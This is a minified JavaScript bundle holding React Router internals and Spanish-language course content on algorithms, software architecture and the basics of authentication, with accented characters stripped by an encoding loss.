e[a.id]=t,t}catch(t){return console.error(`Error loading route module \`${a.module}\`, reloading page...`),console.error(t),window.__reactRouterContext&&window.__reactRouterContext.isSpaMode,window.location.reload(),new Promise(()=>{})}}function rV(a){return a==null?!1:a.href==null?a.rel==="preload"&&typeof a.imageSrcSet=="string"&&typeof a.imageSizes=="string":typeof a.rel=="string"&&typeof a.href=="string"}async function lV(a,e,t){let n=await Promise.all(a.map(async i=>{let r=e.routes[i.route.id];if(r){let l=await sV(r,t);return l.links?l.links():[]}return[]}));return pV(n.flat(1).filter(rV).filter(i=>i.rel==="stylesheet"||i.rel==="preload").map(i=>i.rel==="stylesheet"?{...i,rel:"prefetch",as:"style"}:{...i,rel:"prefetch"}))}function lP(a,e,t,n,i,r){let l=(d,p)=>t[p]?d.route.id!==t[p].route.id:!0,u=(d,p)=>t[p].pathname!==d.pathname||t[p].route.path?.endsWith("*")&&t[p].params["*"]!==d.params["*"];return r==="assets"?e.filter((d,p)=>l(d,p)||u(d,p)):r==="data"?e.filter((d,p)=>{let f=n.routes[d.route.id];if(!f||!f.hasLoader)return!1;if(l(d,p)||u(d,p))return!0;if(d.route.shouldRevalidate){let h=d.route.shouldRevalidate({currentUrl:new URL(i.pathname+i.search+i.hash,window.origin),currentParams:t[0]?.params||{},nextUrl:new URL(a,window.origin),nextParams:d.params,defaultShouldRevalidate:!0});if(typeof h=="boolean")return h}return!0}):[]}function cV(a,e,{includeHydrateFallback:t}={}){return uV(a.map(n=>{let i=e.routes[n.route.id];if(!i)return[];let r=[i.module];return i.clientActionModule&&(r=r.concat(i.clientActionModule)),i.clientLoaderModule&&(r=r.concat(i.clientLoaderModule)),t&&i.hydrateFallbackModule&&(r=r.concat(i.hydrateFallbackModule)),i.imports&&(r=r.concat(i.imports)),r}).flat(1))}function uV(a){return[...new Set(a)]}function dV(a){let e={},t=Object.keys(a).sort();for(let n of t)e[n]=a[n];return e}function pV(a,e){let t=new Set;return new Set(e),a.reduce((n,i)=>{let r=JSON.stringify(dV(i));return t.has(r)||(t.add(r),n.push({key:r,link:i})),n},[])}function $j(){let a=U.useContext(Kc);return r1(a,"You must render this element inside a <DataRouterContext.Provider> element"),a}function mV(){let a=U.useContext(ug);return r1(a,"You must render this element inside a <DataRouterStateContext.Provider> element"),a}var l1=U.createContext(void 0);l1.displayName="FrameworkContext";function Xj(){let a=U.useContext(l1);return r1(a,"You must render this element inside a <HydratedRouter> element"),a}function fV(a,e){let t=U.useContext(l1),[n,i]=U.useState(!1),[r,l]=U.useState(!1),{onFocus:u,onBlur:d,onMouseEnter:p,onMouseLeave:f,onTouchStart:h}=e,E=U.useRef(null);U.useEffect(()=>{if(a==="render"&&l(!0),a==="viewport"){let j=I=>{I.forEach(w=>{l(w.isIntersecting)})},R=new IntersectionObserver(j,{threshold:.5});return E.current&&R.observe(E.current),()=>{R.disconnect()}}},[a]),U.useEffect(()=>{if(n){let j=setTimeout(()=>{l(!0)},100);return()=>{clearTimeout(j)}}},[n]);let C=()=>{i(!0)},A=()=>{i(!1),l(!1)};return t?a!=="intent"?[r,E,{}]:[r,E,{onFocus:ld(u,C),onBlur:ld(d,A),onMouseEnter:ld(p,C),onMouseLeave:ld(f,A),onTouchStart:ld(h,C)}]:[!1,E,{}]}function ld(a,e){return t=>{a&&a(t),t.defaultPrevented||e(t)}}function hV({page:a,...e}){let{router:t}=$j(),n=U.useMemo(()=>kj(t.routes,a,t.basename),[t.routes,a,t.basename]);return n?U.createElement(bV,{page:a,matches:n,...e}):null}function gV(a){let{manifest:e,routeModules:t}=Xj(),[n,i]=U.useState([]);return U.useEffect(()=>{let r=!1;return lV(a,e,t).then(l=>{r||i(l)}),()=>{r=!0}},[a,e,t]),n}function bV({page:a,matches:e,...t}){let n=ai(),{future:i,manifest:r,routeModules:l}=Xj(),{basename:u}=$j(),{loaderData:d,matches:p}=mV(),f=U.useMemo(()=>lP(a,e,p,r,n,"data"),[a,e,p,r,n]),h=U.useMemo(()=>lP(a,e,p,r,n,"assets"),[a,e,p,r,n]),E=U.useMemo(()=>{if(a===n.pathname+n.search+n.hash)return[];let j=new Set,R=!1;if(e.forEach(w=>{let k=r.routes[w.route.id];!k||!k.hasLoader||(!f.some(Y=>Y.route.id===w.route.id)&&w.route.id in d&&l[w.route.id]?.shouldRevalidate||k.hasClientLoader?R=!0:j.add(w.route.id))}),j.size===0)return[];let I=oV(a,u,i.unstable_trailingSlashAwareDataRequests,"data");return R&&j.size>0&&I.searchParams.set("_routes",e.filter(w=>j.has(w.route.id)).map(w=>w.route.id).join(",")),[I.pathname+I.search]},[u,i.unstable_trailingSlashAwareDataRequests,d,n,r,f,e,a,l]),C=U.useMemo(()=>cV(h,r),[h,r]),A=gV(h);return U.createElement(U.Fragment,null,E.map(j=>U.createElement("link",{key:j,rel:"prefetch",as:"fetch",href:j,...t})),C.map(j=>U.createElement("link",{key:j,rel:"modulepreload",href:j,...t})),A.map(({key:j,link:R})=>U.createElement("link",{key:j,nonce:t.nonce,...R,crossOrigin:R.crossOrigin??t.crossOrigin})))}function vV(...a){return e=>{a.forEach(t=>{typeof t=="function"?t(e):t!=null&&(t.current=e)})}}var yV=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u";try{yV&&(window.__reactRouterVersion="7.13.0")}catch{}function EV({basename:a,children:e,unstable_useTransitions:t,window:n}){let i=U.useRef();i.current==null&&(i.current=Z8({window:n,v5Compat:!0}));let r=i.current,[l,u]=U.useState({action:r.action,location:r.location}),d=U.useCallback(p=>{t===!1?u(p):U.startTransition(()=>u(p))},[t]);return U.useLayoutEffect(()=>r.listen(d),[r,d]),U.createElement(KF,{basename:a,children:e,location:l.location,navigationType:l.action,navigator:r,unstable_useTransitions:t})}var Zj=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,jn=U.forwardRef(function({onClick:e,discover:t="render",prefetch:n="none",relative:i,reloadDocument:r,replace:l,state:u,target:d,to:p,preventScrollReset:f,viewTransition:h,unstable_defaultShouldRevalidate:E,...C},A){let{basename:j,unstable_useTransitions:R}=U.useContext(Mn),I=typeof p=="string"&&Zj.test(p),w=Bj(p,j);p=w.to;let k=MF(p,{relative:i}),[Y,ee,Q]=fV(n,C),q=xV(p,{replace:l,state:u,target:d,preventScrollReset:f,relative:i,viewTransition:h,unstable_defaultShouldRevalidate:E,unstable_useTransitions:R});function M(L){e&&e(L),L.defaultPrevented||q(L)}let N=U.createElement("a",{...C,...Q,href:w.absoluteURL||k,onClick:w.isExternal||r?e:M,ref:vV(A,ee),target:d,"data-discover":!I&&t==="render"?"true":void 0});return Y&&!I?U.createElement(U.Fragment,null,N,U.createElement(hV,{page:k})):N});jn.displayName="Link";var SV=U.forwardRef(function({"aria-current":e="page",caseSensitive:t=!1,className:n="",end:i=!1,style:r,to:l,viewTransition:u,children:d,...p},f){let h=Ip(l,{relative:p.relative}),E=ai(),C=U.useContext(ug),{navigator:A,basename:j}=U.useContext(Mn),R=C!=null&&IV(h)&&u===!0,I=A.encodeLocation?A.encodeLocation(h).pathname:h.pathname,w=E.pathname,k=C&&C.navigation&&C.navigation.location?C.navigation.location.pathname:null;t||(w=w.toLowerCase(),k=k?k.toLowerCase():null,I=I.toLowerCase()),k&&j&&(k=Yo(k,j)||k);const Y=I!=="/"&&I.endsWith("/")?I.length-1:I.length;let ee=w===I||!i&&w.startsWith(I)&&w.charAt(Y)==="/",Q=k!=null&&(k===I||!i&&k.startsWith(I)&&k.charAt(I.length)==="/"),q={isActive:ee,isPending:Q,isTransitioning:R},M=ee?e:void 0,N;typeof n=="function"?N=n(q):N=[n,ee?"active":null,Q?"pending":null,R?"transitioning":null].filter(Boolean).join(" ");let L=typeof r=="function"?r(q):r;return U.createElement(jn,{...p,"aria-current":M,className:N,ref:f,style:L,to:l,viewTransition:u},typeof d=="function"?d(q):d)});SV.displayName="NavLink";var CV=U.forwardRef(({discover:a="render",fetcherKey:e,navigate:t,reloadDocument:n,replace:i,state:r,method:l=Gf,action:u,onSubmit:d,relative:p,preventScrollReset:f,viewTransition:h,unstable_defaultShouldRevalidate:E,...C},A)=>{let{unstable_useTransitions:j}=U.useContext(Mn),R=LV(),I=RV(u,{relative:p}),w=l.toLowerCase()==="get"?"get":"post",k=typeof u=="string"&&Zj.test(u),Y=ee=>{if(d&&d(ee),ee.defaultPrevented)return;ee.preventDefault();let Q=ee.nativeEvent.submitter,q=Q?.getAttribute("formmethod")||l,M=()=>R(Q||ee.currentTarget,{fetcherKey:e,method:q,navigate:t,replace:i,state:r,relative:p,preventScrollReset:f,viewTransition:h,unstable_defaultShouldRevalidate:E});j&&t!==!1?U.startTransition(()=>M()):M()};return U.createElement("form",{ref:A,method:w,action:I,onSubmit:n?d:Y,...C,"data-discover":!k&&a==="render"?"true":void 0})});CV.displayName="Form";function TV(a){return`${a} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function eD(a){let e=U.useContext(Kc);return Ga(e,TV(a)),e}function xV(a,{target:e,replace:t,state:n,preventScrollReset:i,relative:r,viewTransition:l,unstable_defaultShouldRevalidate:u,unstable_useTransitions:d}={}){let p=rr(),f=ai(),h=Ip(a,{relative:r});return U.useCallback(E=>{if(aV(E,e)){E.preventDefault();let C=t!==void 0?t:rp(f)===rp(h),A=()=>p(a,{replace:C,state:n,preventScrollReset:i,relative:r,viewTransition:l,unstable_defaultShouldRevalidate:u});d?U.startTransition(()=>A()):A()}},[f,p,h,t,n,e,a,i,r,l,u,d])}var AV=0,PV=()=>`__${String(++AV)}__`;function LV(){let{router:a}=eD("useSubmit"),{basename:e}=U.useContext(Mn),t=GF(),n=a.fetch,i=a.navigate;return U.useCallback(async(r,l={})=>{let{action:u,method:d,encType:p,formData:f,body:h}=iV(r,e);if(l.navigate===!1){let E=l.fetcherKey||PV();await n(E,t,l.action||u,{unstable_defaultShouldRevalidate:l.unstable_defaultShouldRevalidate,preventScrollReset:l.preventScrollReset,formData:f,body:h,formMethod:l.method||d,formEncType:l.encType||p,flushSync:l.flushSync})}else await i(l.action||u,{unstable_defaultShouldRevalidate:l.unstable_defaultShouldRevalidate,preventScrollReset:l.preventScrollReset,formData:f,body:h,formMethod:l.method||d,formEncType:l.encType||p,replace:l.replace,state:l.state,fromRouteId:t,flushSync:l.flushSync,viewTransition:l.viewTransition})},[n,i,e,t])}function RV(a,{relative:e}={}){let{basename:t}=U.useContext(Mn),n=U.useContext(Li);Ga(n,"useFormAction must be used inside a RouteContext");let[i]=n.matches.slice(-1),r={...Ip(a||".",{relative:e})},l=ai();if(a==null){r.search=l.search;let u=new URLSearchParams(r.search),d=u.getAll("index");if(d.some(f=>f==="")){u.delete("index"),d.filter(h=>h).forEach(h=>u.append("index",h));let f=u.toString();r.search=f?`?${f}`:""}}return(!a||a===".")&&i.route.index&&(r.search=r.search?r.search.replace(/^\?/,"?index&"):"?index"),t!=="/"&&(r.pathname=r.pathname==="/"?t:Ho([t,r.pathname])),rp(r)}function IV(a,{relative:e}={}){let t=U.useContext(Vj);Ga(t!=null,"`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");let{basename:n}=eD("useViewTransitionState"),i=Ip(a,{relative:e});if(!t.isTransitioning)return!1;let r=Yo(t.currentLocation.pathname,n)||t.currentLocation.pathname,l=Yo(t.nextLocation.pathname,n)||t.nextLocation.pathname;return Ih(i.pathname,l)!=null||Ih(i.pathname,r)!=null}const aD={id:"algo-structures",title:"Estructuras de Datos y Algoritmos",description:"El ncleo de la informtica. Aprende a pensar de forma algortmica y a escribir cdigo eficiente que escale a millones de usuarios.",completed:!1,track:"Fundamentos de Ingeniera",lessons:[{id:"algo-01-big-o",title:"Big O Notation: Midiendo la Eficiencia",level:"junior",content:`# Leccin 1: Big O Notation - Profundizando en la Eficiencia

En el desarrollo profesional, no basta con que el cdigo "funcione". Debe ser eficiente. **Big O Notation** es la mtrica estndar para describir cmo escala un algoritmo a medida que aumenta el volumen de datos.

## 1. Los Tres Escenarios
*   **Best Case ( - Omega):** El mejor escenario posible (ej: el elemento buscado es el primero).
*   **Average Case ( - Theta):** El comportamiento esperado en la mayora de las ejecuciones.
*   **Worst Case (O - Big O):** El lmite superior. Este es el que nos importa como ingenieros, porque garantiza que el sistema no colapsar ms all de ese punto.

## 2. Jerarqua de Complejidad (de mejor a peor)
1.  **O(1) - Constante:** Acceso directo (ej: \`myArray[5]\`).
2.  **O(log n) - Logartmica:** Divide el problema a la mitad en cada paso (ej: Bsqueda binaria). Extremadamente escalable.
3.  **O(n) - Lineal:** Un recorrido simple (ej: Encontrar el mximo en una lista desordenada).
4.  **O(n log n) - Cuasi-lineal:** El costo de los ordenamientos eficientes (MergeSort, QuickSort).
5.  **O(n) - Cuadrtica:** Bucles anidados. Prohibido para grandes volmenes de datos.
6.  **O(2) - Exponencial:** El tiempo se duplica con cada nuevo dato (ej: Fibonacci recursivo sin optimizar).

## 3. Trade-off: Tiempo vs Memoria (Space Complexity)
Un algoritmo Senior a veces elige usar ms memoria para ganar velocidad. Por ejemplo, guardar resultados previos en un Hash Table para evitar re-clculos (Memoization).

---

### Misin Junior:
Al analizar un cdigo, ignora las constantes. \`O(2n + 5)\` se simplifica a \`O(n)\`. Lo que importa es la tendencia de crecimiento, no los pasos exactos.
`,completed:!1},{id:"algo-02-arrays-strings",title:"Arrays y Strings: Gestin de Memoria",level:"junior",content:`# Leccin 2: Arrays y Strings - Debajo del Cap

Entender cmo el hardware maneja estas estructuras te permite evitar cuellos de botella de rendimiento.

## 1. El Array en Memoria
Un array es un bloque **contiguo** de memoria. 
*   **Aritmtica de Punteros:** El acceso es O(1) porque la computadora calcula la direccin as: \`Direccin Inicial + (ndice * Tamao del Tipo)\`.
*   **Arrays Dinmicos (List/ArrayList):** Cuando se llenan, el lenguaje crea un array nuevo del doble de tamao y copia todo. Esto es una operacin O(n) "amortizada".

## 2. Strings y la Inmutabilidad
En .NET, Java y JS, los strings son inmutables por seguridad y optimizacin (String Interning).
*   **El peligro:** \`for (i = 0; i < 1000; i++) { s += "a"; } \` crea 1000 objetos en memoria.
*   **La solucin:** Usa clases especficas para construccin de texto (ej: \`StringBuilder\` en C#) que manejan un buffer interno mutable.

---

### Misin Junior:
Investiga qu es un "Value Type" vs un "Reference Type". Un array de enteros se comporta distinto en memoria que un array de objetos complejos.
`,completed:!1},{id:"algo-03-busqueda",title:"Bsqueda de Datos: Algoritmos Fundamentales",level:"junior",content:`# Leccin 3: Bsqueda de Datos y punteros

Encontrar informacin eficientemente es el problema nmero 1 de la informtica.

## 1. Bsqueda Lineal (O(n))
Recorrido secuencial. 
*   **Uso:** Listas pequeas o desordenadas. 
*   **Tip:** Si buscas un elemento que no existe, siempre tardars el mximo tiempo.

## 2. Bsqueda Binaria (O(log n))
Requiere que los datos estn **ordenados**.
\`\`\`javascript
function binarySearch(arr, target) {
    let left = 0, right = arr.length - 1;
    while (left <= right) {
        let mid = Math.floor((left + right) / 2);
        if (arr[mid] === target) return mid;
        if (arr[mid] < target) left = mid + 1;
        else right = mid - 1;
    }
    return -1;
}
\`\`\`

## 3. Tcnica de "Two Pointers"
Muy comn en entrevistas. Usar dos ndices (uno al inicio y otro al final) para recorrer el array en una sola pasada O(n). til para problemas como "Encontrar dos nmeros que sumen X".

---

### Misin Junior:
Implementa la bsqueda binaria de forma recursiva. Es un excelente ejercicio para entender cmo se divide el espacio de bsqueda.
`,completed:!1},{id:"algo-04-ordenamiento",title:"Ordenamiento: Del Caos al Orden",level:"junior",content:`# Leccin 4: Algoritmos de Ordenamiento

Ordenar es la base para poder usar Bsqueda Binaria.

## 1. Algoritmos Simples (O(n))
*   **Bubble Sort:** Lento, pero fcil de entender. Intercambia vecinos.
*   **Selection Sort:** Busca el mnimo y lo mueve al frente. til cuando el nmero de intercambios debe ser mnimo.
*   **Insertion Sort:** Cmo ordenas las cartas en tu mano. Muy rpido para listas casi ordenadas.

## 2. Algoritmos Eficientes (O(n log n))
Los que usas en el mundo real (\`Array.sort()\`).
*   **Merge Sort:** Divide el array en mitades, ordena y combina. Usa memoria extra (O(n)).
*   **Quick Sort:** Elige un "pivote" y organiza elementos menores y mayores. Es el ms rpido en promedio, pero su peor caso es O(n).

---

### Misin Junior:
Por qu no usamos siempre Merge Sort si es O(n log n)? Recuerda el Trade-off: Merge Sort requiere el doble de memoria para funcionar, Quick Sort ordena "in-place" (en el mismo sitio).
`,completed:!1},{id:"algo-05-lineales",title:"Estructuras Lineales Avanzadas",level:"semi-senior",content:`# Leccin 5: Listas Enlazadas, Pilas y Colas Profundo

Cuando la memoria contigua de un array no es suficiente o no conocemos el tamao final.

## 1. Listas Enlazadas (Linked Lists)
*   **Singly Linked:** Nodo -> Siguiente.
*   **Doubly Linked:** Anterior <-> Nodo <-> Siguiente. Permite recorrer en ambas direcciones.
*   **Circular:** El ltimo nodo apunta al primero. til para algoritmos de round-robin (turnos).

## 2. Pilas y Colas Especializadas
*   **Priority Queue:** Los elementos salen por prioridad, no solo por llegada. Fundamental para algoritmos de rutas (Dijkstra).
*   **Deque (Double Ended Queue):** Permite insertar y sacar por ambos extremos.

---

### Misin Semi-Senior:
Implementa una cola usando dos pilas. Es un problema clsico de entrevistas para evaluar tu pensamiento lateral sobre la transferencia de datos.
`,completed:!1},{id:"algo-06-hash-tables",title:"Hash Tables y Resolucin de Colisiones",level:"semi-senior",content:`# Leccin 6: Hash Tables: La anatoma del O(1)

La eficiencia de la Hash Table depende de su **Funcin Hash** y cmo maneja cuando dos llaves caen en el mismo sitio.

## 1. Funciones Hash
Debe ser rpida y distribuir las llaves uniformemente para evitar "clusters".

## 2. Resolucin de Colisiones
*   **Chaining:** Cada casilla del array tiene una Lista Enlazada. Si hay colisin, el nuevo elemento se aade a la lista.
*   **Open Addressing:** Si la casilla est ocupada, busca la siguiente disponible (Linear Probing).

## 3. Factor de Carga (Load Factor)
Cuando la tabla est muy llena (>70%), las colisiones aumentan y el O(1) se degrada a O(n). La tabla debe redimensionarse automticamente.

---

### Misin Semi-Senior:
Por qu no se puede usar un objeto como llave en un diccionario si este es mutable? Si cambias el objeto, su Hash cambia y nunca ms lo encontrars!
`,completed:!1},{id:"algo-07-arboles-recursion",title:"Recursin y Recorridos de rboles",level:"semi-senior",content:`# Leccin 7: Pensamiento Recursivo y rboles

Los rboles requieren una forma de pensar distinta al bucle \`for\` tradicional.

## 1. Anatoma de la Recursin
1.  **Caso Base:** La salida de emergencia.
2.  **Lgica:** Qu hacemos con el dato actual.
3.  **Llamada recursiva:** Reducir el problema.

## 2. Recorridos de rboles (Traversal)
*   **Pre-order (Raz, Izq, Der):** Copiar un rbol.
*   **In-order (Izq, Raz, Der):** Obtiene los elementos ordenados en un BST.
*   **Post-order (Izq, Der, Raz):** Eliminar un rbol (primero las hojas).

---

### Misin Semi-Senior:
Calcula la altura de un rbol binario usando recursin. Pista: La altura es \`1 + max(altura_izq, altura_der)\`.
`,completed:!1},{id:"algo-08-grafos-avanzados",title:"Grafos: Modelando Relaciones",level:"senior",content:`# Leccin 8: Grafos y Algoritmos de Caminos

Un grafo es un conjunto de Vrtices (nodos) y Aristas (conexiones).

## 1. Representacin en Cdigo
*   **Matriz de Adyacencia:** Array 2D. Rpido para saber si A y B estn conectados, pero ocupa mucha memoria O(V).
*   **Lista de Adyacencia:** Array de listas. Ms eficiente en memoria para grafos con pocas conexiones.

## 2. Algoritmos de Bsqueda
*   **BFS (Breadth-First):** Usa una **Cola**. Encuentra el camino ms corto en grafos sin peso.
*   **DFS (Depth-First):** Usa una **Pila** (o recursin). Encuentra ciclos o recorre ramas completas.

## 3. Introduccin a Pesos (Dijkstra)
En un mapa, las conexiones tienen costo (distancia). Dijkstra usa una Priority Queue para expandir siempre el camino ms "barato" acumulado.

---

### Misin Senior:
Implementa la deteccin de ciclos en un grafo dirigido usando DFS. Es vital para detectar dependencias circulares en sistemas de paquetes (como npm o nuget).
`,completed:!1},{id:"algo-09-dp-optimizacion",title:"Programacin Dinmica y Backtracking",level:"senior",content:`# Leccin 9: Maestra en Optimizacin

Las tcnicas para cuando la fuerza bruta tardara milenios.

## 1. Programacin Dinmica (DP)
Es "Recursin con Memoria". 
*   **Memoization (Top-Down):** Agregas un diccionario a tu funcin recursiva para guardar resultados.
*   **Tabulation (Bottom-Up):** Llenas una tabla desde el caso base hasta el objetivo.

## 2. Backtracking: Poda de rboles
Es como resolver un laberinto. Vas por un camino, si chocas con pared, vuelves a la ltima interseccin y pruebas otra ruta.
*   Clave: "Podar" ramas que sabes que no llevan a la solucin para ahorrar tiempo.

## 3. Optimizacin de Bajo Nivel
Un Senior entiende que \`O(n)\` recorriendo memoria de forma saltada es ms lento que \`O(n)\` recorriendo memoria de forma lineal debido al **L1/L2 Cache** de la CPU.

---

### Misin Senior:
Resuelve el problema de Fibonacci usando los tres enfoques: Recursivo simple (O(2)), Memoization (O(n)) y Tabulation con espacio optimizado (O(n) tiempo, O(1) espacio). Mira la diferencia abismal de rendimiento.
`,completed:!1},{id:"algo-10-entrevistas",title:"Dominando la Entrevista Tcnica y LeetCode",level:"senior",content:`# Leccin 10: Dominando la Entrevista Tcnica (LeetCode Style)

Saber programar no es lo mismo que saber pasar una entrevista tcnica. Aqu se evala tu capacidad de **resolucin de problemas bajo presin** y tu **comunicacin**.

## 1. El Framework de Resolucin (4 Pasos)
No empieces a escribir cdigo de inmediato. Eso es una "red flag".
1.  **Entender (Understand):** Haz preguntas. Los nmeros pueden ser negativos? El array est ordenado? Puede haber duplicados? Define los "Edge Cases".
2.  **Planear (Plan):** Explica tu enfoque en voz alta. "Podra usar fuerza bruta, pero sera O(n). Mejor usar un Hash Map para hacerlo en O(n)".
3.  **Codificar (Code):** Escribe cdigo limpio. Usa nombres de variables descriptivos, no \`x\` o \`y\`.
4.  **Optimizar (Optimize):** Analiza la complejidad Big O de tu solucin y sugiere mejoras.

## 2. Patrones Comunes (La clave del xito)
Casi todos los problemas de LeetCode caen en una de estas categoras:
*   **Two Pointers:** Para arrays ordenados o palndromos.
*   **Sliding Window:** Para sub-arrays o sub-strings contiguos.
*   **Hash Maps:** Para frecuencias o bsquedas rpidas (O(1)).
*   **Fast & Slow Pointers:** Para detectar ciclos en Linked Lists.

## 3. Ejemplo Real: Two Sum
**Problema:** Dado un array de enteros \`nums\` y un entero \`target\`, devuelve los ndices de los dos nmeros que suman \`target\`.

### Enfoque 1: Fuerza Bruta (No recomendado)
\`\`\`javascript
// O(n) - Demasiado lento
for(let i=0; i<nums.length; i++) {
    for(let j=i+1; j<nums.length; j++) {
        if(nums[i] + nums[j] === target) return [i, j];
    }
}
\`\`\`

### Enfoque 2: Hash Map (Profesional)
\`\`\`javascript
// O(n) - Eficiente
const map = new Map();
for(let i=0; i<nums.length; i++) {
    const complemento = target - nums[i];
    if(map.has(complemento)) return [map.get(complemento), i];
    map.set(nums[i], i);
}
\`\`\`

## 4. Errores Comunes
*   **Programacin Silenciosa:** El entrevistador necesita escuchar tu tren de pensamiento.
*   **Ignorar Edge Cases:** Qu pasa si el input es null? O vaco?
*   **Optimizacin Prematura:** Empieza con una solucin que funcione, luego optimiza. No te bloquees buscando la solucin perfecta desde el segundo 0.

---

### Misin Senior:
Resuelve el problema "Valid Parentheses" (LeetCode #20) usando una **Pila (Stack)**. Es el ejemplo perfecto para demostrar por qu entender las estructuras de datos es ms importante que memorizar cdigo.
`,completed:!1}]},tD={id:"architecture",title:"Arquitectura de Software",description:"De monolitos a microservicios. Aprende a disear sistemas escalables, mantenibles y resilientes.",completed:!1,lessons:[{id:"arch-01",title:"Principios Fundamentales",description:"Conceptos bsicos de diseo de sistemas y patrones arquitectnicos.",content:`
# Fundamentos de Arquitectura

La arquitectura de software no se trata de elegir lenguajes, sino de tomar decisiones sobre la estructura del sistema que son difciles de cambiar ms tarde.

### 1. El Teorema CAP
En sistemas distribuidos, solo puedes garantizar 2 de estas 3 propiedades:
*   **Consistencia**: Todos los nodos ven los mismos datos al mismo tiempo.
*   **Disponibilidad**: Cada peticin recibe una respuesta (sin garanta de que sea la ms reciente).
*   **Particin**: El sistema sigue funcionando a pesar de fallos de red.

### 2. Trade-offs
"There are no silver bullets, only trade-offs." Cada solucin arquitectnica resuelve un problema pero introduce otros. El trabajo del arquitecto es elegir el "veneno" que puede manejar.

### 3. Deuda Tcnica
La decisin consciente de tomar un atajo hoy para entregar valor rpido, sabiendo que habr que "pagarlo" (refactorizar) maana.
            `,level:"junior",completed:!1},{id:"arch-02",title:"Clean Architecture",description:"Diseando sistemas independientes de frameworks y bases de datos.",content:`
# Clean Architecture (Arquitectura Limpia)

Popularizada por Robert C. Martin (Uncle Bob), busca separar las reglas de negocio de los detalles tcnicos.

### Las Capas
1.  **Entidades**: Reglas de negocio crticas.
2.  **Casos de Uso**: Lgica especfica de la aplicacin.
3.  **Adaptadores de Interfaz**: Controladores, Presenters, Gateways.
4.  **Frameworks & Drivers**: DB, UI, Web Frameworks.

### La Regla de Dependencia
Las dependencias siempre deben apuntar hacia **adentro**. Las capas internas no saben nada de las externas. Esto permite cambiar una base de datos SQL por una NoSQL sin tocar una sola lnea de lgica de negocio.
            `,level:"semisenior",completed:!1},{id:"arch-03",title:"Microservicios y Event-Driven",description:"Escalabilidad horizontal y comunicacin asncrona entre servicios.",content:`
# Arquitecturas Modernas

### Monolitos vs Microservicios
Un monolito es ms fcil de desplegar y testear al inicio. Los microservicios brillan cuando el equipo crece y necesitas escalabilidad independiente.

### Event-Driven Design
En lugar de llamadas directas (HTTP), los servicios se comunican a travs de eventos (Kafka, RabbitMQ, Redis).
*   **Ventaja**: Desacoplamiento total. El Servicio A no necesita que el Servicio B est "vivo" para emitir un evento.
*   **Reto**: Consistencia eventual. El sistema no se sincroniza al instante, sino "con el tiempo".
            `,level:"senior",completed:!1},{id:"arch-project",title:"Proyecto: Diseo de Sistema Global",description:"Disea la arquitectura para una red social con millones de usuarios concurrentes.",content:`
# Reto de Arquitectura Senior

### El Escenario
Debes disear una plataforma estilo "Twitter/X" que soporte:
*   100k tweets por segundo.
*   Timeline generado en tiempo real.
*   Alta disponibilidad global.

### Requerimientos de Entrega
1.  Diagrama de servicios (Load Balancers, API Gateway, Microservices).
2.  Estrategia de base de datos (Sharding, Read Replicas).
3.  Capa de Cach (Redis/Memcached).
4.  Manejo de picos de trfico (Colas de mensajes).

**Sugerencia**: Usa el mtodo C4 para documentar tu arquitectura.
            `,level:"senior",completed:!1,isProject:!0}]},nD={id:"auth-security",title:"Autenticacin y Seguridad",description:"Aprende a proteger tus aplicaciones, gestionar usuarios y sesiones de forma segura.",completed:!1,lessons:[{id:"auth-security-01-authn-vs-authz",title:"Qu es autenticacin y autorizacin?",level:"junior",content:`# Leccin 1: Qu es autenticacin y autorizacin?

Muchas personas usan estos trminos como si fueran lo mismo, pero en seguridad web, confundirlos es el primer paso hacia un agujero de seguridad. Vamos a separarlos con claridad quirrgica.

## 1. Autenticacin (Authentication / AuthN)
La autenticacin es el proceso de **verificar quin eres**. Es la respuesta a la pregunta: Eres quien dices ser?

**La analoga del pasaporte:**
Cuando llegas a la frontera de un pas y muestras tu pasaporte, el oficial de migracin mira tu foto, los sellos de seguridad y tu cara. Si todo coincide, l confirma que t eres, efectivamente, la persona que figura en el documento. **Eso es autenticacin.**

En la web, esto suele ser:
*   Email y contrasea.
*   Cdigo enviado al celular (2FA).
*   Huella digital o reconocimiento facial.

## 2. Autorizacin (Authorization / AuthZ)
La autorizacin es el proceso de **verificar qu tienes permitido hacer**. Ocurre *despus* de que ya sabemos quin eres. Es la respuesta a la pregunta: Tienes permiso para entrar aqu o tocar esto?

**La analoga de la discoteca:**
Ya pasaste la puerta (ests autenticado). Ahora quieres entrar al rea VIP. El guardia de esa zona revisa tu pulsera. Si no la tienes, no pasas, aunque seas un cliente legtimo del lugar. **Eso es autorizacin.**

En la web, esto suele ser:
*   Este usuario es administrador?
*   Este usuario es el dueo de este post para poder borrarlo?
*   Este usuario pag la suscripcin Premium para ver este video?

## 3. El flujo lgico
Nunca puedes autorizar a alguien que no ha sido autenticado primero (a menos que sea un "Invitado", pero incluso ah hay una identidad annima).

1.  **Identificacin:** El usuario dice "Soy Juan".
2.  **Autenticacin:** El sistema pide pruebas ("Dame tu clave, Juan").
3.  **Autorizacin:** El sistema revisa su base de datos ("Juan est autenticado, tiene permiso de Admin? No. Entonces no puede borrar la base de datos").

## 4. Error Comn: Confiar por defecto
Un error de Junior es pensar: *"Si el usuario ya entr a la app con su login, puede hacer todo"*. 
**No.** Siempre debes validar la autorizacin en cada peticin sensible. Que alguien haya entrado a tu casa no significa que deba tener la llave de tu caja fuerte.

---

### Ejercicio Prctico 1:
Analiza estas situaciones y clasifcalas como **Autenticacin** o **Autorizacin**:
1.  Ingresar el cdigo de 6 dgitos que te lleg por SMS.
2.  Intentar entrar al panel de control de un sitio y recibir un mensaje de "Acceso Denegado: Solo para editores".
3.  Poner tu huella digital para desbloquear el celular.
4.  Intentar editar un comentario de otro usuario en un foro y que el botn de "Editar" no aparezca.

*Reflexiona: Por qu es peligroso que un programador olvide la Autorizacin despus de haber hecho un Login exitoso?*
`,completed:!1},{id:"auth-security-02-usuarios-y-sesiones",title:"Usuarios y sesiones",level:"junior",content:`# Leccin 2: Usuarios y sesiones

Para la web, cada vez que haces clic en un link o pides una imagen, es como si fuera la primera vez que te ve. HTTP es un protocolo **"stateless" (sin estado)**. No guarda memoria entre una peticin y la siguiente.

Cmo es que Facebook no te pide la contrasea cada vez que das un "Like"? La respuesta son las **Sesiones**.

## 1. El problema de la amnesia de HTTP
